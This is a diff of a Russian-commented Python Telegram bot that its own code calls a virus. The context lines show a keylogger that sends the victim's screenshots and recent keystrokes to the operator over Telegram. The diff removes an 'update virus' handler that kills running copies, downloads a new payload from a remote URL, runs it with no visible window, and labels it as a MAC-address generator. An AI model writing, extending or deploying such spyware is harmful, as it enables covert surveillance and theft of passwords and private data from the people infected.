@@ -43,13 +43,13 @@ listener.start()
 
 # Клавиатура
 keyboard_markup = ReplyKeyboardMarkup(
-    keyboard=[[KeyboardButton(text="Скриншот и нажатия")],[KeyboardButton(text="Обновить вирус")]],
+    keyboard=[[KeyboardButton(text="Скриншот и нажатия")]],
     resize_keyboard=True
 )
 
 @dp.message(CommandStart())
 async def start_handler(message: Message):
-    await message.answer("Получить лог и клавиши.", reply_markup=keyboard_markup)
+    await message.answer("Получить лог и клавиши", reply_markup=keyboard_markup)
 
 @dp.message(F.text.lower() == "скриншот и нажатия")
 async def screenshot_and_keys(message: Message):
@@ -67,34 +67,6 @@ async def screenshot_and_keys(message: Message):
         await message.answer(f"⌨️ Последние клавиши:\n<code>{last_keys}</code>")
     else:
         await message.answer("⌨️ Нет зафиксированных нажатий клавиш.")
-
-@dp.message(F.text.lower() == "обновить вирус")
-async def update_virus(message: Message):
-
-    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-        try:
-            if proc.info['name'] == "python.exe" and FILENAME in " ".join(proc.info['cmdline']):
-                proc.kill()
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-
-    try:
-        if os.path.exists(FILENAME):
-            os.remove(FILENAME)
-        with urllib.request.urlopen(URL) as response:
-            content = response.read()
-        with open(FILENAME, "wb") as f:
-            f.write(content)
-        await message.answer("Скрипт генерации mac адресов скачан.")
-    except Exception as e:
-        await message.answer("Ошибка при скачивании cкрипта генерации mac адресов:", e)
-
-    subprocess.Popen(
-        [sys.executable, FILENAME],
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
-
-    
     
 # Точка входа
 async def main():
